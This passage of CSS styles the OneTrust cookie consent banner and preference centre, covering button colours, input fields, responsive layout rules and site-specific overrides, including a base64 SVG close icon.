      #onetrust-pc-sdk button.ot-sdk-button-primary:hover,
      #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary:hover,
      #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary:hover,
      #onetrust-pc-sdk input[type=button].ot-sdk-button-primary:hover,
      #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
      #onetrust-pc-sdk button.ot-sdk-button-primary:focus,
      #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary:focus,
      #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary:focus,
      #onetrust-pc-sdk input[type=button].ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary:focus {
        color: #fff;
        background-color: #1eaedb;
        border-color: #1eaedb
      }

      #onetrust-banner-sdk input[type=text],
      #onetrust-pc-sdk input[type=text],
      #ot-sdk-cookie-policy input[type=text] {
        height: 38px;
        padding: 6px 10px;
        background-color: #fff;
        border: 1px solid #d1d1d1;
        border-radius: 4px;
        box-shadow: none;
        box-sizing: border-box
      }

      #onetrust-banner-sdk input[type=text],
      #onetrust-pc-sdk input[type=text],
      #ot-sdk-cookie-policy input[type=text] {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none
      }

      #onetrust-banner-sdk input[type=text]:focus,
      #onetrust-pc-sdk input[type=text]:focus,
      #ot-sdk-cookie-policy input[type=text]:focus {
        border: 1px solid #000;
        outline: 0
      }

      #onetrust-banner-sdk label,
      #onetrust-pc-sdk label,
      #ot-sdk-cookie-policy label {
        display: block;
        margin-bottom: .5rem;
        font-weight: 600
      }

      #onetrust-banner-sdk input[type=checkbox],
      #onetrust-pc-sdk input[type=checkbox],
      #ot-sdk-cookie-policy input[type=checkbox] {
        display: inline
      }

      #onetrust-banner-sdk ul,
      #onetrust-pc-sdk ul,
      #ot-sdk-cookie-policy ul {
        list-style: circle inside
      }

      #onetrust-banner-sdk ul,
      #onetrust-pc-sdk ul,
      #ot-sdk-cookie-policy ul {
        padding-left: 0;
        margin-top: 0
      }

      #onetrust-banner-sdk ul ul,
      #onetrust-pc-sdk ul ul,
      #ot-sdk-cookie-policy ul ul {
        margin: 1.5rem 0 1.5rem 3rem;
        font-size: 90%
      }

      #onetrust-banner-sdk li,
      #onetrust-pc-sdk li,
      #ot-sdk-cookie-policy li {
        margin-bottom: 1rem
      }

      #onetrust-banner-sdk th,
      #onetrust-banner-sdk td,
      #onetrust-pc-sdk th,
      #onetrust-pc-sdk td,
      #ot-sdk-cookie-policy th,
      #ot-sdk-cookie-policy td {
        padding: 12px 15px;
        text-align: left;
        border-bottom: 1px solid #e1e1e1
      }

      #onetrust-banner-sdk button,
      #onetrust-pc-sdk button,
      #ot-sdk-cookie-policy button {
        margin-bottom: 1rem;
        font-family: inherit
      }

      #onetrust-banner-sdk .ot-sdk-container:after,
      #onetrust-banner-sdk .ot-sdk-row:after,
      #onetrust-pc-sdk .ot-sdk-container:after,
      #onetrust-pc-sdk .ot-sdk-row:after,
      #ot-sdk-cookie-policy .ot-sdk-container:after,
      #ot-sdk-cookie-policy .ot-sdk-row:after {
        content: "";
        display: table;
        clear: both
      }

      #onetrust-banner-sdk .ot-sdk-row,
      #onetrust-pc-sdk .ot-sdk-row,
      #ot-sdk-cookie-policy .ot-sdk-row {
        margin: 0;
        max-width: none;
        display: block
      }

      #onetrust-banner-sdk {
        box-shadow: 0 0 18px rgba(0, 0, 0, .2)
      }

      #onetrust-banner-sdk.otFlat {
        position: fixed;
        z-index: 2147483645;
        bottom: 0;
        right: 0;
        left: 0;
        background-color: #fff;
        max-height: 90%;
        overflow-x: hidden;
        overflow-y: auto
      }

      #onetrust-banner-sdk.otFlat.top {
        top: 0px;
        bottom: auto
      }

      #onetrust-banner-sdk.otRelFont {
        font-size: 1rem
      }

      #onetrust-banner-sdk>.ot-sdk-container {
        overflow: hidden
      }

      #onetrust-banner-sdk::-webkit-scrollbar {
        width: 11px
      }

      #onetrust-banner-sdk::-webkit-scrollbar-thumb {
        border-radius: 10px;
        background: #c1c1c1
      }

      #onetrust-banner-sdk {
        scrollbar-arrow-color: #c1c1c1;
        scrollbar-darkshadow-color: #c1c1c1;
        scrollbar-face-color: #c1c1c1;
        scrollbar-shadow-color: #c1c1c1
      }

      #onetrust-banner-sdk #onetrust-policy {
        margin: 1.25em 0 .625em 2em;
        overflow: hidden
      }

      #onetrust-banner-sdk #onetrust-policy .ot-gv-list-handler {
        float: left;
        font-size: .82em;
        padding: 0;
        margin-bottom: 0;
        border: 0;
        line-height: normal;
        height: auto;
        width: auto
      }

      #onetrust-banner-sdk #onetrust-policy-title {
        font-size: 1.2em;
        line-height: 1.3;
        margin-bottom: 10px
      }

      #onetrust-banner-sdk #onetrust-policy-text {
        clear: both;
        text-align: left;
        font-size: .88em;
        line-height: 1.4
      }

      #onetrust-banner-sdk #onetrust-policy-text * {
        font-size: inherit;
        line-height: inherit
      }

      #onetrust-banner-sdk #onetrust-policy-text a {
        font-weight: bold;
        margin-left: 5px
      }

      #onetrust-banner-sdk #onetrust-policy-title,
      #onetrust-banner-sdk #onetrust-policy-text {
        color: dimgray;
        float: left
      }

      #onetrust-banner-sdk #onetrust-button-group-parent {
        min-height: 1px;
        text-align: center
      }

      #onetrust-banner-sdk #onetrust-button-group {
        display: inline-block
      }

      #onetrust-banner-sdk #onetrust-accept-btn-handler,
      #onetrust-banner-sdk #onetrust-reject-all-handler,
      #onetrust-banner-sdk #onetrust-pc-btn-handler {
        background-color: #68b631;
        color: #fff;
        border-color: #68b631;
        margin-right: 1em;
        min-width: 125px;
        height: auto;
        white-space: normal;
        word-break: break-word;
        word-wrap: break-word;
        padding: 12px 10px;
        line-height: 1.2;
        font-size: .813em;
        font-weight: 600
      }

      #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
        background-color: #fff;
        border: none;
        color: #68b631;
        text-decoration: underline;
        padding-left: 0;
        padding-right: 0
      }

      #onetrust-banner-sdk .onetrust-close-btn-ui {
        width: 44px;
        height: 44px;
        background-size: 12px;
        border: none;
        position: relative;
        margin: auto;
        padding: 0
      }

      #onetrust-banner-sdk .banner_logo {
        display: none
      }

      #onetrust-banner-sdk.ot-bnr-w-logo .ot-bnr-logo {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        left: 0px
      }

      #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-policy {
        margin-left: 65px
      }

      #onetrust-banner-sdk .ot-b-addl-desc {
        clear: both;
        float: left;
        display: block
      }

      #onetrust-banner-sdk #banner-options {
        float: left;
        display: table;
        margin-right: 0;
        margin-left: 1em;
        width: calc(100% - 1em)
      }

      #onetrust-banner-sdk .banner-option-input {
        cursor: pointer;
        width: auto;
        height: auto;
        border: none;
        padding: 0;
        padding-right: 3px;
        margin: 0 0 10px;
        font-size: .82em;
        line-height: 1.4
      }

      #onetrust-banner-sdk .banner-option-input * {
        pointer-events: none;
        font-size: inherit;
        line-height: inherit
      }

      #onetrust-banner-sdk .banner-option-input[aria-expanded=true]~.banner-option-details {
        display: block;
        height: auto
      }

      #onetrust-banner-sdk .banner-option-input[aria-expanded=true] .ot-arrow-container {
        transform: rotate(90deg)
      }

      #onetrust-banner-sdk .banner-option {
        margin-bottom: 12px;
        margin-left: 0;
        border: none;
        float: left;
        padding: 0
      }

      #onetrust-banner-sdk .banner-option:first-child {
        padding-left: 2px
      }

      #onetrust-banner-sdk .banner-option:not(:first-child) {
        padding: 0;
        border: none
      }

      #onetrust-banner-sdk .banner-option-header {
        cursor: pointer;
        display: inline-block
      }

      #onetrust-banner-sdk .banner-option-header :first-child {
        color: dimgray;
        font-weight: bold;
        float: left
      }

      #onetrust-banner-sdk .banner-option-header .ot-arrow-container {
        display: inline-block;
        border-top: 6px solid rgba(0, 0, 0, 0);
        border-bottom: 6px solid rgba(0, 0, 0, 0);
        border-left: 6px solid dimgray;
        margin-left: 10px;
        vertical-align: middle
      }

      #onetrust-banner-sdk .banner-option-details {
        display: none;
        font-size: .83em;
        line-height: 1.5;
        padding: 10px 0px 5px 10px;
        margin-right: 10px;
        height: 0px
      }

      #onetrust-banner-sdk .banner-option-details * {
        font-size: inherit;
        line-height: inherit;
        color: dimgray
      }

      #onetrust-banner-sdk .ot-arrow-container,
      #onetrust-banner-sdk .banner-option-details {
        transition: all 300ms ease-in 0s;
        -webkit-transition: all 300ms ease-in 0s;
        -moz-transition: all 300ms ease-in 0s;
        -o-transition: all 300ms ease-in 0s
      }

      #onetrust-banner-sdk .ot-dpd-container {
        float: left
      }

      #onetrust-banner-sdk .ot-dpd-title {
        margin-bottom: 10px
      }

      #onetrust-banner-sdk .ot-dpd-title,
      #onetrust-banner-sdk .ot-dpd-desc {
        font-size: .88em;
        line-height: 1.4;
        color: dimgray
      }

      #onetrust-banner-sdk .ot-dpd-title *,
      #onetrust-banner-sdk .ot-dpd-desc * {
        font-size: inherit;
        line-height: inherit
      }

      #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text * {
        margin-bottom: 0
      }

      #onetrust-banner-sdk.ot-iab-2 .onetrust-vendors-list-handler {
        display: block;
        margin-left: 0;
        margin-top: 5px;
        clear: both;
        margin-bottom: 0;
        padding: 0;
        border: 0;
        height: auto;
        width: auto
      }

      #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
        display: block
      }

      #onetrust-banner-sdk.ot-close-btn-link {
        padding-top: 25px
      }

      #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container {
        top: 15px;
        transform: none;
        right: 15px
      }

      #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container button {
        padding: 0;
        white-space: pre-wrap;
        border: none;
        height: auto;
        line-height: 1.5;
        text-decoration: underline;
        font-size: .69em
      }

      #onetrust-banner-sdk #onetrust-policy-text,
      #onetrust-banner-sdk .ot-dpd-desc,
      #onetrust-banner-sdk .ot-b-addl-desc {
        font-size: .813em;
        line-height: 1.5
      }

      #onetrust-banner-sdk .ot-dpd-desc {
        margin-bottom: 10px
      }

      #onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc {
        margin-top: 10px;
        margin-bottom: 10px;
        font-size: 1em
      }

      @media only screen and (max-width: 425px) {
        #onetrust-banner-sdk #onetrust-close-btn-container {
          position: absolute;
          top: 6px;
          right: 2px
        }

        #onetrust-banner-sdk #onetrust-policy {
          margin-left: 0;
          margin-top: 3em
        }

        #onetrust-banner-sdk #onetrust-button-group {
          display: block
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
          width: 100%
        }

        #onetrust-banner-sdk .onetrust-close-btn-ui {
          top: auto;
          transform: none
        }

        #onetrust-banner-sdk #onetrust-policy-title {
          display: inline;
          float: none
        }

        #onetrust-banner-sdk #banner-options {
          margin: 0;
          padding: 0;
          width: 100%
        }
      }

      @media only screen and (min-width: 426px)and (max-width: 896px) {
        #onetrust-banner-sdk #onetrust-close-btn-container {
          position: absolute;
          top: 0;
          right: 0
        }

        #onetrust-banner-sdk #onetrust-policy {
          margin-left: 1em;
          margin-right: 1em
        }

        #onetrust-banner-sdk .onetrust-close-btn-ui {
          top: 10px;
          right: 10px
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
          width: 95%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-group-container {
          width: 100%
        }

        #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-button-group-parent {
          padding-left: 50px
        }

        #onetrust-banner-sdk #onetrust-button-group-parent {
          width: 100%;
          position: relative;
          margin-left: 0
        }

        #onetrust-banner-sdk #onetrust-button-group button {
          display: inline-block
        }

        #onetrust-banner-sdk #onetrust-button-group {
          margin-right: 0;
          text-align: center
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
          float: left
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-reject-all-handler,
        #onetrust-banner-sdk .has-reject-all-button #onetrust-accept-btn-handler {
          float: right
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-button-group {
          width: calc(100% - 2em);
          margin-right: 0
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
          padding-left: 0px;
          text-align: left
        }

        #onetrust-banner-sdk.ot-buttons-fw .ot-sdk-three button {
          width: 100%;
          text-align: center
        }

        #onetrust-banner-sdk.ot-buttons-fw #onetrust-button-group-parent button {
          float: none
        }

        #onetrust-banner-sdk.ot-buttons-fw #onetrust-pc-btn-handler.cookie-setting-link {
          text-align: center
        }
      }

      @media only screen and (min-width: 550px) {
        #onetrust-banner-sdk .banner-option:not(:first-child) {
          border-left: 1px solid #d8d8d8;
          padding-left: 25px
        }
      }

      @media only screen and (min-width: 425px)and (max-width: 550px) {

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group,
        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy,
        #onetrust-banner-sdk.ot-iab-2 .banner-option {
          width: 100%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group #onetrust-accept-btn-handler,
        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group #onetrust-reject-all-handler,
        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group #onetrust-pc-btn-handler {
          width: 100%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group #onetrust-accept-btn-handler,
        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group #onetrust-reject-all-handler {
          float: left
        }
      }

      @media only screen and (min-width: 769px) {
        #onetrust-banner-sdk #onetrust-button-group {
          margin-right: 30%
        }

        #onetrust-banner-sdk #banner-options {
          margin-left: 2em;
          margin-right: 5em;
          margin-bottom: 1.25em;
          width: calc(100% - 7em)
        }
      }

      @media only screen and (min-width: 897px)and (max-width: 1023px) {
        #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
          position: absolute;
          top: 50%;
          left: 75%;
          transform: translateY(-50%)
        }

        #onetrust-banner-sdk #onetrust-close-btn-container {
          top: 50%;
          margin: auto;
          transform: translate(-50%, -50%);
          position: absolute;
          padding: 0;
          right: 0
        }

        #onetrust-banner-sdk #onetrust-close-btn-container button {
          position: relative;
          margin: 0;
          right: -22px;
          top: 2px
        }
      }

      @media only screen and (min-width: 1024px) {
        #onetrust-banner-sdk #onetrust-close-btn-container {
          top: 50%;
          margin: auto;
          transform: translate(-50%, -50%);
          position: absolute;
          right: 0
        }

        #onetrust-banner-sdk #onetrust-close-btn-container button {
          right: -12px
        }

        #onetrust-banner-sdk #onetrust-policy {
          margin-left: 2em
        }

        #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
          position: absolute;
          top: 50%;
          left: 60%;
          transform: translateY(-50%)
        }

        #onetrust-banner-sdk .ot-optout-signal {
          width: 50%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-title {
          width: 50%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text,
        #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
          margin-bottom: 1em;
          width: 50%;
          border-right: 1px solid #d8d8d8;
          padding-right: 1rem
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text {
          margin-bottom: 0;
          padding-bottom: 1em
        }

        #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
          margin-bottom: 0;
          padding-bottom: 1em
        }

        #onetrust-banner-sdk.ot-iab-2 .ot-dpd-container {
          width: 45%;
          padding-left: 1rem;
          display: inline-block;
          float: none
        }

        #onetrust-banner-sdk.ot-iab-2 .ot-dpd-title {
          line-height: 1.7
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group-parent {
          left: auto;
          right: 4%;
          margin-left: 0
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
          display: block
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
          margin: auto;
          width: 30%
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
          width: 60%
        }

        #onetrust-banner-sdk #onetrust-button-group {
          margin-right: auto
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
          margin-top: 1em
        }
      }

      @media only screen and (min-width: 890px) {
        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group-parent {
          padding-left: 3%;
          padding-right: 4%;
          margin-left: 0
        }

        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group {
          margin-right: 0;
          margin-top: 1.25em;
          width: 100%
        }

        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button {
          width: 100%;
          margin-bottom: 5px;
          margin-top: 5px
        }

        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button:last-of-type {
          margin-bottom: 20px
        }
      }

      @media only screen and (min-width: 1280px) {
        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
          width: 55%
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
          width: 44%;
          padding-left: 2%;
          padding-right: 2%
        }

        #onetrust-banner-sdk:not(.ot-iab-2).vertical-align-content #onetrust-button-group-parent {
          position: absolute;
          left: 55%
        }
      }

      #onetrust-consent-sdk #onetrust-banner-sdk {
        background-color: #f2f2f2;
      }

      #onetrust-consent-sdk #onetrust-policy-title,
      #onetrust-consent-sdk #onetrust-policy-text,
      #onetrust-consent-sdk .ot-b-addl-desc,
      #onetrust-consent-sdk .ot-dpd-desc,
      #onetrust-consent-sdk .ot-dpd-title,
      #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
      #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
      #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
      #onetrust-banner-sdk .ot-cat-header,
      #onetrust-banner-sdk .ot-optout-signal {
        color: #333333;
      }

      #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
        background-color: #E9E9E9;
      }

      #onetrust-consent-sdk #onetrust-banner-sdk a[href],
      #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
      #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn {
        color: #3860BE;
      }

      #onetrust-consent-sdk #onetrust-accept-btn-handler,
      #onetrust-banner-sdk #onetrust-reject-all-handler {
        background-color: #e50914;
        border-color: #e50914;
        color: #FFFFFF;
      }

      #onetrust-consent-sdk #onetrust-banner-sdk *:focus,
      #onetrust-consent-sdk #onetrust-banner-sdk:focus {
        outline-color: #696969;
        outline-width: 1px;
      }

      #onetrust-consent-sdk #onetrust-pc-btn-handler,
      #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
        color: #333333;
        border-color: #333333;
        background-color:
          #FFFFFF;
      }

      #onetrust-button-group-parent {
        border-radius: 0.25rem;
        position: relative !important;
        float: none !important;
        left: unset !important;
        padding-left: 0 !important;
        padding-right: 0 !important;
        margin-left: 32px !important;

        @media (max-width: 896px) {
          margin-left: 16px !important;
        }
      }

      #onetrust-consent-sdk a {
        color: #333 !important;
        font-weight: bold !important;
        text-decoration: none !important;
        font-size: inherit !important;
      }

      #onetrust-consent-sdk a:hover {
        text-decoration: underline !important;
      }

      #onetrust-consent-sdk *[data-optanongroupid=C0001] .ot-toggle-group .ot-always-active,
      #onetrust-consent-sdk *[data-optanongroupid=C0002] .ot-toggle-group .ot-always-active {
        visibility: hidden;
        pointer-events: none;
      }

      #onetrust-pc-sdk #select-all-container {
        display: none;
      }

      #onetrust-consent-sdk *[data-optanongroupid=C0002] .category-host-list-btn,
      #onetrust-consent-sdk *[data-optanongroupid*=C0001] .category-host-list-btn {
        display: none !important;
      }

      #onetrust-group-container {
        /* text bois */
        width: 95% !important;
      }

      /* Buttons to the bottoms */
      #onetrust-button-group {
        width: 95% !important;
      }

      #onetrust-pc-btn-handler,
      #onetrust-reject-all-handler,
      #onetrust-accept-btn-handler {
        float: left !important;
      }

      #onetrust-banner-sdk {
        top: 90px !important;
        width: 90%;
        margin: auto;
      }

      #onetrust-policy {
        margin-bottom: 0px !important;
      }

      @media (max-width: 896px) {
        #onetrust-close-btn-container {
          top: 0 !important;
          right: 0 !important;
        }

        .ot-sdk-container {
          padding-left: 15px !important;
          padding-right: 15px !important;
        }

        #onetrust-policy {
          margin-top: 15px !important;
          margin-bottom: 5px !important;
        }

        #onetrust-banner-sdk {
          top: 62px !important;
          width: 96%;
        }

        #onetrust-policy-text {
          font-size: 10px !important;
          line-height: 1.25 !important;
        }

        #onetrust-button-group-parent {
          display: block !important;
          margin-left: 0 !important;
        }

        #onetrust-pc-btn-handler,
        #onetrust-reject-all-handler,
        #onetrust-accept-btn-handler {
          margin-bottom: 3px !important;
          padding: 5px !important;
          font-size: 11px !important;
        }

        #onetrust-accept-btn-handler {
          margin-bottom: 15px !important;
        }
      }

      @media (max-width: 532px) {

        #onetrust-pc-btn-handler,
        #onetrust-reject-all-handler,
        #onetrust-accept-btn-handler {
          width: 100% !important;
        }
      }

      #onetrust-pc-sdk {
        position: fixed;
        width: 730px;
        max-width: 730px;
        height: 610px;
        left: 0;
        right: 0;
        top: 0;
        bottom: 0;
        margin: auto;
        font-size: 16px;
        z-index: 2147483647;
        border-radius: 2px;
        background-color: #fff;
        box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0), 0 7px 14px 0 rgba(50, 50, 93, .1)
      }

      #onetrust-pc-sdk.otRelFont {
        font-size: 1rem
      }

      #onetrust-pc-sdk *,
      #onetrust-pc-sdk ::after,
      #onetrust-pc-sdk ::before {
        box-sizing: content-box
      }

      #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr,
      #onetrust-pc-sdk .ot-hide-tgl {
        visibility: hidden
      }

      #onetrust-pc-sdk #ot-addtl-venlst .ot-arw-cntr *,
      #onetrust-pc-sdk .ot-hide-tgl * {
        visibility: hidden
      }

      #onetrust-pc-sdk #ot-pc-content,
      #onetrust-pc-sdk #ot-pc-lst {
        height: calc(100% - 185px)
      }

      #onetrust-pc-sdk li {
        list-style: none
      }

      #onetrust-pc-sdk ul,
      #onetrust-pc-sdk li {
        margin: 0
      }

      #onetrust-pc-sdk a {
        text-decoration: none
      }

      #onetrust-pc-sdk .ot-link-btn {
        padding: 0;
        margin-bottom: 0;
        border: 0;
        font-weight: normal;
        line-height: normal;
        width: auto;
        height: auto
      }

      #onetrust-pc-sdk .ot-grps-cntr *::-webkit-scrollbar,
      #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar {
        width: 11px
      }

      #onetrust-pc-sdk .ot-grps-cntr *::-webkit-scrollbar-thumb,
      #onetrust-pc-sdk .ot-pc-scrollbar::-webkit-scrollbar-thumb {
        border-radius: 10px;
        background: #c1c1c1
      }

      #onetrust-pc-sdk .ot-grps-cntr *,
      #onetrust-pc-sdk .ot-pc-scrollbar {
        scrollbar-arrow-color: #c1c1c1;
        scrollbar-darkshadow-color: #c1c1c1;
        scrollbar-face-color: #c1c1c1;
        scrollbar-shadow-color: #c1c1c1
      }

      #onetrust-pc-sdk .ot-pc-header {
        height: auto;
        padding: 10px;
        display: block;
        width: calc(100% - 20px);
        min-height: 52px;
        border-bottom: 1px solid #d8d8d8;
        position: relative
      }

      #onetrust-pc-sdk .ot-pc-logo {
        vertical-align: middle;
        width: 180px
      }

      #onetrust-pc-sdk .ot-pc-logo.ot-pc-logo {
        height: 40px
      }

      #onetrust-pc-sdk .ot-title-cntr {
        position: relative;
        display: inline-block;
        vertical-align: middle;
        width: calc(100% - 190px);
        padding-left: 10px
      }

      #onetrust-pc-sdk .ot-optout-signal {
        margin: .625rem .625rem .625rem 1.75rem
      }

      #onetrust-pc-sdk .ot-always-active {
        font-size: .813em;
        line-height: 1.5;
        font-weight: 700;
        color: #3860be
      }

      #onetrust-pc-sdk .ot-close-cntr {
        float: right;
        position: absolute;
        right: -9px;
        top: 50%;
        transform: translateY(-50%)
      }

      #onetrust-pc-sdk #ot-pc-content {
        position: relative;
        overflow-y: auto;
        overflow-x: hidden
      }

      #onetrust-pc-sdk #ot-pc-content .ot-sdk-container {
        margin-left: 0
      }

      #onetrust-pc-sdk .ot-grps-cntr,
      #onetrust-pc-sdk .ot-grps-cntr>* {
        height: 100%;
        overflow-y: auto
      }

      #onetrust-pc-sdk .category-menu-switch-handler {
        cursor: pointer;
        border-left: 10px solid rgba(0, 0, 0, 0);
        background-color: #f4f4f4;
        border-bottom: 1px solid #d7d7d7;
        padding-top: 12px;
        padding-right: 5px;
        padding-bottom: 12px;
        padding-left: 12px;
        overflow: hidden
      }

      #onetrust-pc-sdk .category-menu-switch-handler h3 {
        float: left;
        text-align: left;
        margin: 0;
        color: dimgray;
        line-height: 1.4;
        font-size: .875em;
        word-break: break-word;
        word-wrap: break-word
      }

      #onetrust-pc-sdk .ot-active-menu {
        border-left: 10px solid #68b631;
        background-color: #fff;
        border-bottom: none;
        position: relative
      }

      #onetrust-pc-sdk .ot-active-menu h3 {
        color: #263238;
        font-weight: bold
      }

      #onetrust-pc-sdk .ot-desc-cntr {
        word-break: break-word;
        word-wrap: break-word;
        padding-top: 20px;
        padding-right: 16px;
        padding-bottom: 15px
      }

      #onetrust-pc-sdk .ot-grp-desc {
        word-break: break-word;
        word-wrap: break-word;
        text-align: left;
        font-size: .813em;
        line-height: 1.5;
        margin: 0
      }

      #onetrust-pc-sdk .ot-grp-desc * {
        font-size: inherit;
        line-height: inherit
      }

      #onetrust-pc-sdk #ot-pc-desc a {
        color: #3860be;
        cursor: pointer;
        font-size: 1em;
        margin-right: 8px
      }

      #onetrust-pc-sdk #ot-pc-desc a:hover {
        color: #1883fd
      }

      #onetrust-pc-sdk #ot-pc-desc button {
        margin-right: 8px
      }

      #onetrust-pc-sdk #ot-pc-desc * {
        font-size: inherit
      }

      #onetrust-pc-sdk #ot-pc-desc ul li {
        padding: 10px 0px;
        border-bottom: 1px solid #e2e2e2
      }

      #onetrust-pc-sdk #ot-pc-desc+.ot-link-btn {
        display: none
      }

      #onetrust-pc-sdk .ot-btn-subcntr {
        float: right
      }

      #onetrust-pc-sdk .ot-close-icon {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjQ3Ljk3MSIgaGVpZ2h0PSI0Ny45NzEiIHZpZXdCb3g9IjAgMCA0Ny45NzEgNDcuOTcxIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA0Ny45NzEgNDcuOTcxOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZD0iTTI4LjIyOCwyMy45ODZMNDcuMDkyLDUuMTIyYzEuMTcyLTEuMTcxLDEuMTcyLTMuMDcxLDAtNC4yNDJjLTEuMTcyLTEuMTcyLTMuMDctMS4xNzItNC4yNDIsMEwyMy45ODYsMTkuNzQ0TDUuMTIxLDAuODhjLTEuMTcyLTEuMTcyLTMuMDctMS4xNzItNC4yNDIsMGMtMS4xNzIsMS4xNzEtMS4xNzIsMy4wNzEsMCw0LjI0MmwxOC44NjUsMTguODY0TDAuODc5LDQyLjg1Yy0xLjE3MiwxLjE3MS0xLjE3MiwzLjA3MSwwLDQuMjQyQzEuNDY1LDQ3LjY3NywyLjIzMyw0Ny45NywzLDQ3Ljk3czEuNTM1LTAuMjkzLDIuMTIxLTAuODc5bDE4Ljg2NS0xOC44NjRMNDIuODUsNDcuMDkxYzAuNTg2LDAuNTg2LDEuMzU0LDAuODc5LDIuMTIxLDAuODc5czEuNTM1LTAuMjkzLDIuMTIxLTAuODc5YzEuMTcyLTEuMTcxLDEuMTcyLTMuMDcxLDAtNC4yNDJMMjguMjI4LDIzLjk4NnoiLz48L2c+PC9zdmc+");
        background-size: 12px;
        background-repeat: no-repeat;
        background-position: center;
        height: 44px;
        width: 44px;
        display: inline-block
      }

      #onetrust-pc-sdk .ot-tgl {
        float: right;
        position: relative;
        z-index: 1
      }

      #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob {
        background-color: #3c7356
      }

      #onetrust-pc-sdk .ot-tgl input:checked+.ot-switch .ot-switch-nob:before {
        -webkit-transform: translateX(16px);
        -ms-transform: translateX(16px);
        transform: translateX(16px);
        background-color: #6f9681
      }

      #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch .ot-switch-nob:before {
        box-shadow: 0 0 1px #2196f3;
        outline-style: auto;
        outline-width: 1px
      }

      #onetrust-pc-sdk .ot-switch {
        position: relative;
        display: inline-block;
        width: 35px;
        height: 10px;
        margin-bottom: 0
      }

